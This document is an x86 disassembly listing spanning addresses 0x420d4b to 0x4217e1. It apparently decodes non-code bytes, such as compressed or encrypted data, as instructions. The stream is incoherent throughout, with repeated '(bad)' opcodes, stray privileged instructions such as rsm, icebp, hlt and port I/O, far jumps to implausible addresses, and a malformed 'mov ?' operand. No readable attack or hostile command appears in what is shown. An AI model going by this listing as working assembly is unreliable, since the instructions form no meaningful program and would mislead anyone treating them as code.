  420d4b:	sub    BYTE PTR [ecx],0x30
  420d4e:	jbe    0x420d10
  420d50:	loop   0x420d35
  420d52:	sbb    dh,dh
  420d54:	out    0xcd,eax
  420d56:	xor    eax,0x7a145f61
  420d5b:	pop    ecx
  420d5c:	das    
  420d5d:	add    eax,0xb51265d4
  420d62:	add    al,0x4b
  420d64:	outs   dx,BYTE PTR ds:[esi]
  420d65:	adc    eax,0xa99434ea
  420d6a:	inc    ebx
  420d6b:	sbb    DWORD PTR [eax],ecx
  420d6d:	outs   dx,DWORD PTR ds:[esi]
  420d6e:	xor    esp,esp
  420d70:	push   esi
  420d71:	mov    eax,ds:0xb815ed8d
  420d76:	sbb    DWORD PTR [eax-0x75],edi
  420d79:	iret   
  420d7a:	pushf  
  420d7b:	imul   esi,eax,0x4f846e1f
  420d81:	aas    
  420d82:	fbstp  TBYTE PTR [ecx]
  420d84:	scas   eax,DWORD PTR es:[edi]
  420d85:	pop    es
  420d86:	sub    eax,0x6874c6c
  420d8b:	inc    ebx
  420d8c:	dec    edx
  420d8d:	adc    al,0x27
  420d8f:	add    al,0x56
  420d91:	adc    DWORD PTR [esi+0x7],eax
  420d94:	dec    esp
  420d95:	jno    0x420db4
  420d97:	xor    dl,cl
  420d99:	xor    al,0x99
  420d9b:	xchg   ebp,eax
  420d9c:	dec    ebp
  420d9d:	ins    BYTE PTR es:[edi],dx
  420d9e:	je     0x420d85
  420da0:	jecxz  0x420d92
  420da2:	sbb    eax,0x5585a75
  420da7:	mov    ah,0x9d
  420da9:	in     al,0x1b
  420dab:	or     ch,BYTE PTR [eax]
  420dad:	cmp    DWORD PTR [ecx+0x71],ebp
  420db0:	xor    BYTE PTR [eax],bh
  420db2:	outs   dx,BYTE PTR ds:[esi]
  420db3:	jl     0x420d82
  420db5:	loopne 0x420d8b
  420db7:	xchg   edx,eax
  420db8:	in     eax,0xa0
  420dba:	dec    ecx
  420dbb:	cmp    eax,0x30e0e104
  420dc0:	jae    0x420d52
  420dc2:	pushf  
  420dc3:	mov    ah,BYTE PTR [edi+0x77]
  420dc6:	adc    ebx,0xe39fcd80
  420dcc:	push   ebx
  420dcd:	pop    esp
  420dce:	dec    di
  420dd0:	rsm    
  420dd2:	ret    
  420dd3:	sti    
  420dd4:	inc    esi
  420dd5:	push   esp
  420dd6:	push   ebx
  420dd7:	in     al,dx
  420dd8:	cmp    eax,0x42455cf
  420ddd:	cdq    
  420dde:	or     dh,BYTE PTR [ecx-0x322a0d33]
  420de4:	jge    0x420dc7
  420de6:	fisttp QWORD PTR [esi+0x5]
  420de9:	(bad)  
  420dea:	push   edi
  420deb:	daa    
  420dec:	pop    ebp
  420ded:	rol    BYTE PTR [eax],1
	...
  420e53:	add    BYTE PTR [eax],al
  420e55:	add    bh,ah
  420e57:	push   ds
  420e58:	into   
  420e59:	push   0x9fe7f8ff
  420e5e:	push   esi
  420e5f:	inc    edi
  420e60:	lahf   
  420e61:	mov    al,ds:0x629281a9
  420e66:	addr16 popa 
  420e68:	add    DWORD PTR [eax],eax
  420e6a:	add    BYTE PTR [ecx],al
  420e6c:	add    BYTE PTR [eax],al
  420e6e:	jg     0x420e14
  420e70:	rol    ecx,1
  420e72:	div    BYTE PTR [esp+edx*2+0x74975c90]
  420e79:	mov    ss,WORD PTR [eax]
  420e7b:	xor    al,0xd2
  420e7d:	lods   al,BYTE PTR ds:[esi]
  420e7e:	jo     0x420e53
  420e80:	(bad)  
  420e81:	dec    ebp
  420e82:	fstp   DWORD PTR [ecx-0x62bc7f9]
  420e88:	test   BYTE PTR [esi+0x2e561d27],al
  420e8e:	cs xor al,0xec
  420e91:	test   eax,0x3f7d3bfa
  420e96:	sub    BYTE PTR [ebx+ebp*8+0x49],bl
  420e9a:	or     al,0xfb
  420e9c:	rcr    edi,0xdc
  420e9f:	fsub   st,st(7)
  420ea1:	mov    ?,esp
  420ea3:	(bad)
  420ea7:	sub    dl,BYTE PTR [edi]
  420ea9:	rol    BYTE PTR [eax],0xe2
  420eac:	in     eax,dx
  420ead:	and    DWORD PTR [esi-0x12],ebx
  420eb0:	adc    esi,DWORD PTR [edi]
  420eb2:	push   ds
  420eb3:	adc    esi,DWORD PTR [ebx+0x72a1a63]
  420eb9:	xchg   edi,eax
  420eba:	pop    esp
  420ebb:	fwait
  420ebc:	jbe    0x420f22
  420ebe:	sahf   
  420ebf:	stos   DWORD PTR es:[edi],eax
  420ec0:	data16 cmp BYTE PTR [ebx-0x1c],bh
  420ec4:	call   0x7c946732
  420ec9:	sub    BYTE PTR fs:[edx+0x5b],dl
  420ecd:	pop    DWORD PTR [ebx-0x7c]
  420ed0:	pop    ss
  420ed1:	mov    esi,0x77b3a73a
  420ed6:	xchg   edx,eax
  420ed7:	mov    ecx,0xb7de519e
  420edc:	call   DWORD PTR [eax]
  420ede:	pop    ecx
  420edf:	jle    0x420e92
  420ee1:	xor    al,0x5f
  420ee3:	popa   
  420ee4:	mov    ss,WORD PTR ds:0x68b267f
  420eea:	clc    
  420eeb:	cwde   
  420eec:	push   edx
  420eed:	push   ebp
  420eee:	sti    
  420eef:	cwde   
  420ef0:	fimul  DWORD PTR [edi-0x2ee876a7]
  420ef6:	pop    eax
  420ef7:	sti    
  420ef8:	pop    esi
  420ef9:	fdiv   QWORD PTR [ebp+0x2a]
  420efc:	jmp    0x24359334
  420f01:	enter  0x1f67,0xae
  420f05:	mov    ds:0xf806ad9d,al
  420f0a:	jnp    0x420f08
  420f0c:	das    
  420f0d:	xor    al,0x9
  420f0f:	or     ecx,DWORD PTR [ecx+ebp*1-0x5f60598f]
  420f16:	dec    esi
  420f17:	push   esi
  420f18:	push   esi
  420f19:	repz mov ebx,0x194b26c7
  420f1f:	jge    0x420ed6
  420f21:	or     DWORD PTR [ecx-0x5573b86e],0xffffffe5
  420f28:	xlat   BYTE PTR ds:[ebx]
  420f29:	shl    DWORD PTR [edi+ebx*4],1
  420f2c:	pop    es
  420f2d:	inc    edi
  420f2e:	mov    bh,0x4f
  420f30:	(bad)  
  420f31:	jmp    0xbb3d8c29
  420f36:	rol    DWORD PTR [edx+0x553de353],cl
  420f3c:	mov    dl,0xd3
  420f3e:	cmp    ebx,DWORD PTR [edx-0xf]
  420f41:	es dec ebx
  420f43:	inc    eax
  420f44:	aas    
  420f45:	fwait
  420f46:	push   eax
  420f47:	je     0x420f49
  420f49:	loop   0x420ed4
  420f4b:	bound  edx,QWORD PTR [edx+0x36]
  420f4e:	test   DWORD PTR [ecx+0x7548d322],0x416cf7ff
  420f58:	xchg   ebx,eax
  420f59:	jae    0x420f30
  420f5b:	xchg   BYTE PTR [ebx+0x7a],bh
  420f5e:	js     0x420fb3
  420f60:	mov    esi,edi
  420f62:	mov    edi,0x5a5d743
  420f67:	stc    
  420f68:	cmp    BYTE PTR [edx],0x87
  420f6b:	sub    BYTE PTR [ebp+0x16],bl
	...
  420fd6:	and    BYTE PTR [edi-0x28082cbe],dl
  420fdc:	mov    cl,0xf7
  420fde:	jg     0x420fcd
  420fe0:	or     esp,DWORD PTR [esi+0x71f6b2e5]
  420fe6:	bound  eax,QWORD PTR [bx+di]
  420fe9:	add    BYTE PTR [eax],al
  420feb:	add    DWORD PTR [eax],eax
  420fed:	add    BYTE PTR [ecx],dl
  420fef:	in     al,0xbf
  420ff1:	and    BYTE PTR [ecx+0x665b4bd0],ah
  420ff7:	das    
  420ff8:	stc    
  420ff9:	mov    dh,0x92
  420ffb:	nop
  420ffc:	xchg   ebx,eax
  420ffd:	nop
  420ffe:	push   0xffffffc4
  421000:	aam    0xe
  421002:	mov    esp,0xc42bd71a
  421007:	dec    eax
  421008:	cli    
  421009:	shr    ebx,1
  42100b:	out    dx,eax
  42100c:	das    
  42100d:	inc    eax
  42100e:	(bad)  
  42100f:	aad    0x2e
  421011:	repnz cmp eax,0xc9512685
  421017:	jmp    0x4a48:0xfbee558
  42101e:	push   edx
  42101f:	int    0xa1
  421021:	loop   0x420fe4
  421023:	push   ecx
  421024:	jnp    0x420fc4
  421026:	mov    al,0x4
  421028:	lds    edi,FWORD PTR [ebx-0x421c0685]
  42102e:	sbb    DWORD PTR [eax+0x2ac60398],eax
  421034:	sub    esi,edx
  421036:	aaa    
  421037:	rol    ebp,1
  421039:	pop    es
  42103a:	mov    dl,0x2b
  42103c:	call   DWORD PTR [eax]
  42103e:	data16 and al,BYTE PTR [ecx+0x171de294]
  421045:	xor    eax,DWORD PTR [esi]
  421047:	inc    edi
  421048:	xor    ebx,ebx
  42104a:	mov    edx,0xfc07ba4f
  42104f:	in     al,dx
  421050:	jb     0x420ff3
  421052:	test   al,0x22
  421054:	stos   BYTE PTR es:[edi],al
  421055:	dec    edi
  421056:	inc    esp
  421057:	dec    esp
  421058:	jle    0x421020
  42105a:	loop   0x4210a7
  42105c:	call   0x7b87:0x86d8ff94
  421063:	(bad)  
  421064:	clc    
  421065:	mov    ebx,0x2629e6b3
  42106a:	fld    DWORD PTR ds:[ebp+0x234f23a3]
  421071:	and    eax,0x30887d2b
  421076:	(bad)  
  421077:	enter  0xe75,0xa
  42107b:	sbb    dh,BYTE PTR [esi]
  42107d:	loopne 0x4210d8
  42107f:	stc    
  421080:	cmp    ebx,DWORD PTR [edi+esi*1+0x232cbdf5]
  421087:	jne    0x42103a
  421089:	arpl   di,si
  42108b:	les    edi,FWORD PTR [edx+0x213a5b92]
  421091:	sbb    eax,0x3459036b
  421096:	icebp  
  421097:	ror    BYTE PTR [ecx+0x51de4519],0xfc
  42109e:	sti    
  42109f:	outs   dx,BYTE PTR ds:[esi]
  4210a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210a1:	fld    QWORD PTR [edx+0x37013a5f]
  4210a7:	loope  0x4210e2
  4210a9:	icebp  
  4210aa:	inc    edx
  4210ab:	aam    0xb1
  4210ad:	lahf   
  4210ae:	sub    DWORD PTR [eax],0x766436ce
  4210b4:	(bad)  
  4210b5:	je     0x4210dd
  4210b7:	mov    ebx,DWORD PTR [ebx-0x51]
  4210ba:	(bad)  
  4210bc:	add    eax,0xf9922979
  4210c1:	xchg   esp,eax
  4210c2:	pop    ebx
  4210c3:	lods   eax,DWORD PTR ds:[esi]
  4210c4:	rcl    BYTE PTR [eax-0x61],0xb
  4210c8:	sar    ecx,1
  4210ca:	std    
  4210cb:	lds    ecx,FWORD PTR [ebx+0x59]
  4210ce:	mov    ecx,0xa3122a38
  4210d3:	(bad)  
  4210d4:	dec    eax
  4210d5:	jno    0x421093
  4210d7:	xchg   ebx,eax
  4210d8:	call   0x596ecbdc
  4210dd:	fwait
  4210de:	aad    0x9b
  4210e0:	or     BYTE PTR ds:0xfb1df830,ch
  4210e6:	lods   al,BYTE PTR ds:[esi]
  4210e7:	mov    bl,0x7a
  4210e9:	and    DWORD PTR [esi+eiz*4],edi
  4210ec:	(bad)  
  4210ed:	dec    ebp
	...
  421156:	lahf   
  421157:	pop    esi
  421158:	fcmovb st,st(6)
  42115a:	fcmovnb st,st(6)
  42115c:	lahf   
  42115d:	pop    edi
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	jne    0x421143
  421161:	mov    fs,WORD PTR ds:0x672d1850
  421167:	arpl   WORD PTR [ecx],ax
  421169:	add    BYTE PTR [eax],al
  42116b:	add    DWORD PTR [eax],eax
  42116d:	add    BYTE PTR [edx-0x2c43f191],dl
  421173:	mov    ebx,0x882df2d9
  421178:	xchg   ebp,eax
  421179:	cs shl edi,0x9f
  42117d:	(bad)  
  42117f:	xchg   ebx,eax
  421180:	pusha  
  421181:	mov    ebp,0x6a590534
  421186:	rol    DWORD PTR [ebp+0x2ca61d2f],1
  42118c:	out    0x7d,al
  42118e:	add    edi,DWORD PTR [esi+0x69]
  421191:	cmp    esp,DWORD PTR [eax-0x70]
  421194:	nop
  421195:	sbb    bl,BYTE PTR [eax]
  421197:	mov    edi,0xe6c76af1
  42119c:	mov    edx,0x3b73cdf
  4211a1:	xchg   ebp,eax
  4211a2:	jmp    0xcc07e40e
  4211a7:	sbb    DWORD PTR [ecx],ecx
  4211a9:	xchg   ebx,eax
  4211aa:	sbb    al,0x51
  4211ac:	addr16 ret 
  4211ae:	mov    esp,0xfb800de7
  4211b3:	sub    BYTE PTR [ebx],0xb3
  4211b6:	je     0x4211b3
  4211b8:	ret    0x5c5a
  4211bb:	and    edx,ebx
  4211bd:	cdq    
  4211be:	out    0x5a,al
  4211c0:	jno    0x421175
  4211c2:	sar    BYTE PTR [eax+eax*1-0x6352cab8],0x6d
  4211ca:	mov    bh,0x6b
  4211cc:	inc    edx
  4211cd:	loope  0x421237
  4211cf:	xor    eax,0xf76cb833
  4211d4:	sub    al,dl
  4211d6:	out    dx,al
  4211d7:	(bad)  
  4211d8:	adc    eax,0x80125ade
  4211dd:	repz jmp 0x421171
  4211e0:	aaa    
  4211e1:	mov    bl,0x35
  4211e3:	and    bh,BYTE PTR [edx+0x59]
  4211e6:	sbb    DWORD PTR [bx+si-0x7b],esi
  4211ea:	cmp    al,0x8d
  4211ec:	mov    esi,0xd202f615
  4211f1:	test   DWORD PTR [edx-0x52],0xdbdf3760
  4211f8:	pop    esi
  4211f9:	popa   
  4211fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211fc:	outs   dx,BYTE PTR ds:[esi]
  4211fd:	mov    edx,DWORD PTR [ebx+0xdb5c49a]
  421203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421204:	inc    ebp
  421205:	sar    BYTE PTR [edx-0x43],cl
  421208:	xchg   ecx,eax
  421209:	jns    0x4211a5
  42120b:	mov    dl,0xa0
  42120d:	xchg   ebp,eax
  42120e:	ins    DWORD PTR es:[edi],dx
  42120f:	sbb    dl,dh
  421211:	fnstenv [ecx-0x6735e688]
  421217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421218:	sub    al,0x81
  42121a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42121b:	sub    DWORD PTR [edi],ebx
  42121d:	sub    eax,0xfa2fde2
  421222:	xor    al,0x1b
  421224:	mov    esp,0x7af9fa02
  421229:	imul   ebx,DWORD PTR [eax+0x73],0xf0944eff
  421230:	cmp    al,0x13
  421232:	xchg   edi,eax
  421233:	stos   BYTE PTR es:[edi],al
  421234:	jae    0x42121c
  421236:	or     BYTE PTR [ecx-0x1c],0x31
  42123a:	mov    al,0x63
  42123c:	out    dx,eax
  42123d:	cld    
  42123e:	inc    ebx
  42123f:	inc    edi
  421240:	retf   
  421241:	jae    0x421255
  421243:	dec    eax
  421244:	test   DWORD PTR [edi-0x3928aea4],ebx
  42124a:	cmp    al,0x8
  42124c:	daa    
  42124d:	cmc    
  42124e:	adc    DWORD PTR [esi],ebp
  421250:	inc    eax
  421251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421252:	js     0x4212ca
  421254:	or     ebp,DWORD PTR ss:[eax-0x2cf4730d]
  42125b:	xchg   ebp,eax
  42125c:	sahf   
  42125d:	pop    esp
  42125e:	sti    
  42125f:	fldenv [esi-0x8]
  421263:	ja     0x421266
  421265:	ret    0xd7a2
  421268:	neg    DWORD PTR [ebx]
  42126a:	fsub   DWORD PTR gs:[edi]
  42126d:	jmp    0x42126f
	...
  4212d3:	add    BYTE PTR [eax],al
  4212d5:	add    BYTE PTR [esi-0x700870e1],bl
  4212db:	idiv   esi
  4212dd:	jg     0x42129c
  4212df:	sub    eax,0xb1d27ab3
  4212e4:	lods   al,BYTE PTR ds:[esi]
  4212e5:	pop    edi
  4212e6:	add    DWORD PTR fs:[bx+si],eax
  4212ea:	add    BYTE PTR [ecx],al
  4212ec:	add    BYTE PTR [eax],al
  4212ee:	leave  
  4212ef:	cdq    
  4212f0:	push   esp
  4212f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212f2:	sub    dl,BYTE PTR [ebx-0x1d]
  4212f5:	bound  esp,QWORD PTR [ebx+ebx*2-0x76]
  4212f9:	(bad)
  4212fc:	addr16 loope 0x4212cd
  4212ff:	in     al,0x86
  421301:	and    dh,BYTE PTR [si+0xf54]
  421306:	rol    BYTE PTR ds:0x753fd876,1
  42130c:	mov    ch,0xb2
  42130e:	jmp    0x8fc32115
  421313:	aaa    
  421314:	repz sub ebx,0xffffffc1
  421318:	push   ecx
  421319:	sar    DWORD PTR [ebx-0x757b7424],1
  42131f:	in     eax,0xb9
  421321:	mov    cl,0x0
  421323:	add    eax,0x1741566e
  421328:	sar    BYTE PTR [ebx+0x508a9b73],0x16
  42132f:	jmp    0x56308307
  421334:	sub    edx,eax
  421336:	nop
  421337:	dec    ebx
  421338:	sub    al,0x5e
  42133a:	std    
  42133b:	outs   dx,BYTE PTR ds:[esi]
  42133c:	repz sbb eax,0xa31caa4
  421342:	enter  0xf86a,0x68
  421346:	xor    al,0x3c
  421348:	sbb    DWORD PTR [ecx-0x1a304213],ebx
  42134e:	and    edx,DWORD PTR [ecx]
  421350:	fisub  DWORD PTR [ebp-0x61]
  421353:	sub    eax,0xa74632c0
  421358:	mov    ah,0xff
  42135a:	pop    ebx
  42135b:	retf   0xb171
  42135e:	(bad)  
  42135f:	dec    ebp
  421360:	loopne 0x421399
  421362:	ss (bad) 
  421364:	mov    dl,0x2f
  421366:	test   al,0x38
  421368:	jmp    0xdc992b51
  42136d:	and    BYTE PTR [eax-0x44],cl
  421370:	aaa    
  421371:	fcmovne st,st(0)
  421373:	neg    BYTE PTR [ecx+edi*8]
  421376:	cmp    DWORD PTR [esp+ecx*1+0x4d2fc3ad],eax
  42137d:	mov    DWORD PTR [eax],ebp
  42137f:	dec    esi
  421380:	ret    0x1f50
  421383:	xor    ebx,ecx
  421385:	jne    0x421377
  421387:	and    al,ah
  421389:	mov    bh,0xbc
  42138b:	adc    al,0x5b
  42138d:	xlat   BYTE PTR ds:[ebx]
  42138e:	mov    edi,0x7dff6549
  421393:	mov    bl,0xe0
  421395:	sbb    eax,0x3bc871f8
  42139a:	scas   al,BYTE PTR es:[edi]
  42139b:	dec    edi
  42139c:	repz jp 0x421409
  42139f:	adc    dh,BYTE PTR [ecx-0x4d]
  4213a2:	ret    0x279b
  4213a5:	into   
  4213a6:	pop    ecx
  4213a7:	adc    ebp,DWORD PTR [ebx-0x7d7169a]
  4213ad:	les    ecx,FWORD PTR [edi]
  4213af:	pop    ecx
  4213b0:	xchg   edx,eax
  4213b1:	mov    al,ds:0xb8755a3
  4213b6:	cmp    al,0xee
  4213b8:	sbb    al,0x2a
  4213ba:	sub    DWORD PTR [esp+edi*4+0x5b794f9b],0xffffffb1
  4213c2:	loop   0x42138f
  4213c4:	inc    edx
  4213c5:	xchg   bl,bh
  4213c7:	fstp   DWORD PTR [ebp-0x64]
  4213ca:	pause  
  4213cc:	mov    al,ds:0x40d9c144
  4213d1:	pop    esi
  4213d2:	and    al,0xc2
  4213d4:	jae    0x4213b3
  4213d6:	push   ebx
  4213d7:	fidivr DWORD PTR [eax-0x9]
  4213da:	stos   BYTE PTR es:[edi],al
  4213db:	or     BYTE PTR [eax+ebp*2-0x7c],dh
  4213df:	out    dx,al
  4213e0:	jle    0x42141e
  4213e2:	lods   al,BYTE PTR ds:[esi]
  4213e3:	cdq    
  4213e4:	dec    eax
  4213e5:	sbb    esp,DWORD PTR [edx-0x694e603a]
  4213eb:	mov    bh,0xa2
	...
  421455:	add    dh,bh
  421457:	(bad)  
  421458:	pop    esp
  421459:	mov    eax,ds:0xdfffbb7d
  42145e:	fstp   DWORD PTR [ebp-0x76f0b61]
  421464:	test   BYTE PTR [edi+eiz*2+0x65],bl
  421468:	add    DWORD PTR [eax],eax
  42146a:	add    BYTE PTR [ecx],al
  42146c:	add    BYTE PTR [eax],al
  42146e:	cmp    DWORD PTR [ebx],esi
  421470:	cmp    DWORD PTR [eax+0x7f],edi
  421473:	mov    eax,DWORD PTR [ecx-0x3e43173d]
  421479:	add    eax,0xec11a4
  42147e:	loope  0x4214a9
  421480:	jmp    0xbaca7d88
  421485:	inc    eax
  421486:	clc    
  421487:	inc    ecx
  421488:	mov    esi,0xebfe508e
  42148d:	iret   
  42148e:	call   0x8450:0x4ac99875
  421495:	pusha  
  421496:	loopne 0x42147c
  421498:	jae    0x421436
  42149a:	mov    ch,BYTE PTR [edx+0xbe5fe7a]
  4214a0:	fmul   QWORD PTR [esi-0x490c275a]
  4214a6:	xor    BYTE PTR [ebx+0x79],0x1f
  4214aa:	or     al,BYTE PTR [esi-0x18]
  4214ad:	pop    ebp
  4214ae:	lahf   
  4214af:	(bad)  
  4214b1:	or     edx,edi
  4214b3:	cmp    BYTE PTR [edx+0x6e],0x21
  4214b7:	ret    0xf881
  4214ba:	jp     0x421510
  4214bc:	retf   0x1648
  4214bf:	mul    DWORD PTR [edx-0x6531a6d9]
  4214c5:	(bad)  
  4214c6:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4214c8:	les    eax,FWORD PTR [edi]
  4214ca:	outs   dx,BYTE PTR ds:[esi]
  4214cb:	mov    fs,WORD PTR ds:0xc2134e64
  4214d1:	fs xchg ebp,eax
  4214d3:	jae    0x421471
  4214d5:	repz rcr bl,cl
  4214d8:	sbb    dl,bh
  4214da:	adc    ebx,DWORD PTR ds:0x72496e47
  4214e0:	mov    esp,DWORD PTR [ebp+0x3c]
  4214e3:	mov    eax,es:0x9e759a72
  4214e9:	pushf  
  4214ea:	loope  0x421514
  4214ec:	adc    bh,BYTE PTR [edi+0x17]
  4214ef:	scas   al,BYTE PTR es:[edi]
  4214f0:	adc    ah,BYTE PTR [ebx+0xd]
  4214f3:	aaa    
  4214f4:	pop    esi
  4214f5:	cld    
  4214f6:	pop    ss
  4214f7:	cdq    
  4214f8:	xchg   edi,eax
  4214f9:	pop    ebx
  4214fa:	icebp  
  4214fb:	mov    gs,WORD PTR [ebp-0x1]
  4214fe:	pop    esp
  4214ff:	faddp  st(6),st
  421501:	cmp    ecx,edi
  421503:	call   0x106:0x81005ad4
  42150a:	jnp    0x4214f9
  42150c:	jmp    0xe174082c
  421511:	push   ds
  421512:	xchg   ebp,eax
  421513:	jns    0x421582
  421515:	(bad)  
  421516:	cmp    BYTE PTR [edx+eax*2-0x38],dl
  42151a:	and    dh,BYTE PTR [edx]
  42151c:	xlat   BYTE PTR ds:[ebx]
  42151d:	pop    ecx
  42151e:	sub    ebx,DWORD PTR [ebx+0x41a7058c]
  421524:	shl    DWORD PTR [ebp-0x3b],0x84
  421528:	lods   al,BYTE PTR ds:[esi]
  421529:	call   0xb61f16d4
  42152e:	and    dl,bh
  421530:	dec    esi
  421531:	xchg   BYTE PTR [edx],ch
  421533:	add    al,0xe6
  421535:	mov    bl,0x20
  421537:	mov    bh,0x5b
  421539:	inc    eax
  42153a:	jg     0x42156a
  42153c:	std    
  42153d:	pop    edi
  42153e:	shl    bl,cl
  421540:	pop    ebx
  421541:	enter  0xa559,0x77
  421545:	sub    ebp,DWORD PTR [esi+0x764a9eac]
  42154b:	into   
  42154c:	popf   
  42154d:	cmp    al,0xe5
  42154f:	es fwait
  421551:	jle    0x4215ad
  421553:	mov    dh,0xe7
  421555:	in     al,0x2b
  421557:	jbe    0x4214f3
  421559:	sbb    BYTE PTR [ebx+0x6b82b2ff],bl
  42155f:	leave  
  421560:	arpl   WORD PTR [ebp-0x79984966],ax
  421566:	aas    
  421567:	stos   DWORD PTR es:[edi],eax
  421568:	push   edx
  421569:	mov    ds:0x181de446,al
	...
  4215d6:	(bad)  
  4215d7:	repnz test BYTE PTR [eax],bl
  4215da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215db:	jle    0x4215bb
  4215dd:	(bad)  
  4215de:	arpl   WORD PTR [eax+0x158842b4],bp
  4215e4:	cmp    DWORD PTR [ebp+0x67],ebx
  4215e7:	add    WORD PTR [eax],ax
  4215ea:	add    BYTE PTR [ecx],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	inc    edx
  4215ef:	je     0x4215ab
  4215f1:	push   es
  4215f2:	cmp    di,WORD PTR [esi]
  4215f5:	mov    gs:0x4bee7cf4,eax
  4215fb:	pop    ds
  4215fc:	jmp    0x4d6da5c8
  421601:	ret    
  421602:	stc    
  421603:	(bad)  
  421605:	leave  
  421606:	enter  0xad,0xb3
  42160a:	call   0xa17011f7
  42160f:	or     eax,0x2b6603ac
  421614:	and    al,0x46
  421616:	daa    
  421617:	out    dx,eax
  421618:	(bad)  
  421619:	xlat   BYTE PTR ds:[ebx]
  42161a:	ret    
  42161b:	sbb    dl,BYTE PTR [esi]
  42161d:	mov    cl,0x76
  42161f:	add    ebp,DWORD PTR [ecx]
  421621:	adc    DWORD PTR [esi-0x31],esi
  421624:	inc    eax
  421625:	pop    esi
  421626:	retf   0xd7dc
  421629:	(bad)  
  42162a:	xchg   esp,eax
  42162b:	pop    edi
  42162c:	cs mov bl,ah
  42162f:	adc    bl,BYTE PTR [eax]
  421631:	sub    DWORD PTR [esp+eax*4],ecx
  421634:	hlt    
  421635:	gs dec ebx
  421637:	fist   WORD PTR [ebp-0x7e6c0797]
  42163d:	sbb    BYTE PTR [ebx-0xb3da7cd],0xf3
  421644:	dec    ebx
  421645:	hlt    
  421646:	scas   eax,DWORD PTR es:[edi]
  421647:	pop    edi
  421648:	cmp    eax,0x645d619b
  42164d:	adc    DWORD PTR ds:0x4fa99e37,esp
  421653:	jmp    0x4216b4
  421655:	stos   BYTE PTR es:[edi],al
  421656:	sbb    eax,0x4fb8d26b
  42165b:	and    eax,0xd8fae1f8
  421660:	sbb    al,0x4e
  421662:	aaa    
  421663:	shr    DWORD PTR ds:[eax+0x4889e461],cl
  42166a:	or     DWORD PTR [ebp-0x7c92db7b],ecx
  421670:	call   0x1e34:0xf0fdb01c
  421677:	(bad)  
  421679:	rol    DWORD PTR ds:0x7a581b5d,1
  42167f:	stos   BYTE PTR es:[edi],al
  421680:	sbb    al,0xfb
  421682:	pop    esp
  421683:	mov    bl,0xf6
  421685:	iret   
  421686:	ror    BYTE PTR [ebx],cl
  421688:	cmp    al,0xb0
  42168a:	(bad)  
  42168b:	sar    DWORD PTR [ebx-0x2c4af447],1
  421691:	out    0x1d,al
  421693:	test   al,0x6f
  421695:	(bad)  
  421696:	jp     0x4216ee
  421698:	jp     0x42163e
  42169a:	pop    ss
  42169b:	addr16 xchg ecx,eax
  42169d:	sbb    esi,DWORD PTR [ebx+0x3c591193]
  4216a3:	push   0x4a
  4216a5:	jle    0x4216d2
  4216a7:	mov    edi,0x217e5803
  4216ac:	cdq    
  4216ad:	push   ss
  4216ae:	push   ebp
  4216af:	mov    edi,0x3355ec8c
  4216b4:	fnstcw WORD PTR [ecx-0x3117d836]
  4216ba:	pop    edi
  4216bb:	push   ss
  4216bc:	hlt    
  4216bd:	imul   ch
  4216bf:	(bad)  
  4216c0:	cmc    
  4216c1:	adc    eax,0xbd2babec
  4216c6:	repnz adc DWORD PTR [ebx+0x70],ebx
  4216ca:	sub    BYTE PTR [edi],dl
  4216cc:	sub    al,0x5e
  4216ce:	cdq    
  4216cf:	mov    eax,0x6932a3b5
  4216d4:	in     eax,dx
  4216d5:	mov    ?,edi
  4216d7:	jle    0x4216ac
  4216d9:	jns    0x42172b
  4216db:	and    DWORD PTR [ebx+0x7c],eax
  4216de:	fsubr  DWORD PTR ds:0xef25d780
  4216e4:	inc    ebx
  4216e5:	ins    DWORD PTR es:[edi],dx
  4216e6:	(bad)  
  4216e8:	pop    edi
  4216e9:	and    ebx,esi
  4216eb:	out    0x24,eax
  4216ed:	add    BYTE PTR es:[eax],al
	...
  421754:	add    BYTE PTR [eax],al
  421756:	stos   DWORD PTR es:[edi],eax
  421757:	sub    al,0xed
  421759:	stos   BYTE PTR es:[edi],al
  42175a:	out    dx,eax
  42175b:	jmp    0x42174c
  42175d:	sub    eax,0xa3418669
  421762:	out    0xb3,al
  421764:	sub    al,0x75
  421766:	addr16 add DWORD PTR [bx+si],eax
  42176a:	add    BYTE PTR [ecx],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	femms  
  421770:	mov    edi,0x62c43589
  421775:	push   0x69
  421777:	dec    ebx
  421778:	int3   
  421779:	jne    0x421717
  42177b:	rcl    DWORD PTR [ebx+0x19cf0877],cl
  421781:	sub    esi,DWORD PTR [edi*8-0x5dd6b046]
  421788:	in     eax,0xa9
  42178a:	pop    ebx
  42178b:	push   esp
  42178c:	shl    DWORD PTR [ebx+0x58],0x7d
  421790:	or     ebp,ecx
  421792:	sbb    BYTE PTR ds:[si],dh
  421796:	dec    edi
  421797:	pop    ss
  421798:	inc    ebx
  421799:	pop    ebx
  42179a:	bound  ecx,QWORD PTR [edi+esi*8]
  42179d:	es (bad) 
  4217a0:	sbb    DWORD PTR [esi-0x7b],edi
  4217a3:	sub    edx,DWORD PTR [eax+0xc]
  4217a6:	add    al,0x1a
  4217a8:	and    bl,BYTE PTR [edi-0x2b457521]
  4217ae:	xchg   esp,eax
  4217af:	fadd   DWORD PTR [ebp+0x63]
  4217b2:	fnstsw WORD PTR [edx-0x616523a3]
  4217b8:	in     eax,0x64
  4217ba:	shr    BYTE PTR [ebp+0x44],1
  4217bd:	jbe    0x421762
  4217bf:	enter  0xd4b2,0x64
  4217c3:	cmp    al,BYTE PTR [edx-0x56]
  4217c6:	push   es
  4217c7:	sub    BYTE PTR [ebp+edi*1+0x1a],0xd9
  4217cc:	fisttp WORD PTR [eax+eax*8+0x40]
  4217d0:	setnp  BYTE PTR cs:[edx]
  4217d4:	push   0xffffffea
  4217d6:	in     al,0xf7
  4217d8:	mov    bh,0xa
  4217da:	cli    
  4217db:	and    ch,BYTE PTR [edx-0x256a9da8]
  4217e1:	mov    ch,0xd
